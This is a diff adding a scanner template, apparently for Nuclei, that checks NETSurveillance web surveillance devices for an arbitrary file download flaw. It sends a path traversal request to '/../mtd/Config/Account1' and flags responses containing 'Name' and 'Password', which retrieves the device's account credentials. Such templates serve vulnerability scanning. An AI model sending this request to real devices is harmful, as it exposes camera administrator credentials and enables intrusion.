@@ -1,0 +1,21 @@
+id: NETSurveillance-fileRead
+info:
+  author: Str1am
+  name: "NETSurveillance WEB\u76D1\u63A7\u4EFB\u610F\u6587\u4EF6\u4E0B\u8F7D"
+  severity: high
+  tags: NETSurveillance,fileRead
+requests:
+- matchers:
+  - status:
+    - 200
+    type: status
+  - condition: and
+    part: body
+    type: word
+    words:
+    - Name
+    - Password
+  matchers-condition: and
+  method: GET
+  path:
+  - '{{BaseURL}}/../mtd/Config/Account1'
